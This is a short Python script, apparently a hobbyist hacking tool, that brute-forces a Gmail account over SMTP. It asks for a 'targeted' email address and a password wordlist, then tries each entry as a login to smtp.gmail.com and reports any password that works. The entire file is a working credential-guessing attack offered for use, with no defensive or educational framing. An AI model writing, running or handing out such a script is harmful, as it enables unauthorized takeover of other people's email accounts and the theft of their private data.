import  smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter email id: ")    #enter targeted email
passwd = input("Enter password file name: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
        smtpserver.login(user, password)
        print("Password found: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("Password not found")